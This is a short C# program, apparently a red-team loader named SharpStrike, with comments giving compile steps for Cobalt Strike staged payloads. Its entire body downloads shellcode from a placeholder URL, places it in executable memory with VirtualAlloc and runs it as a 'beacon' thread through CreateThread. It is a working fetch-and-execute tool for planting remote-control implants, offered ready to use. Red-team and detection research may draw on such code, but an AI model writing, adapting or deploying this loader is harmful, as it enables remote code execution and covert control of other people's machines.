/* 
   Inspired by: https://github.com/RedXRanger/defcon27_csharp_workshop
                https://github.com/rsmudge/metasploit-loader
                https://www.contextis.com/en/blog/a-beginners-guide-to-windows-shellcode-execution-techniques
                
   For 32bit Compilation, just compile as any CPU (if you are using a CS 32bit stage)
   For 64bit Com[ilation, you MUST create a new target type, make it 64bit then compile it as 64bit (if you are using staged 64bit in CS)
   
   Compiled in Visual Studio Community edition 2019
   Uses .NET Framework 2.0
*/

using System;
using System.Runtime.InteropServices;
using System.Net;

namespace SharpStrike
{

    class Program
    { 
        //WinAPI imports
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

      static void Main()
        {
            //Make a webclient object
            WebClient wc = new WebClient();
            
            //Download the CS stage into a byte array. Should point to the URI you set in your profile
            byte [] shellcode = wc.DownloadData("hxxp://YourUrl.com/URIstage");

            //Alloc the memory with the right flags
            IntPtr stageBuf = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
            //Copy stage from Managed to Unmanaged MemoryBuffer 
            Marshal.Copy(shellcode, 0, stageBuf, shellcode.Length);
            
            //Create a new thread named beacon
            IntPtr beacon = CreateThread(IntPtr.Zero, 0, stageBuf, IntPtr.Zero, 0, IntPtr.Zero);
            
            //Keep the thread running forever... 
            WaitForSingleObject(beacon, 0xFFFFFFFF);

        }
    }
}
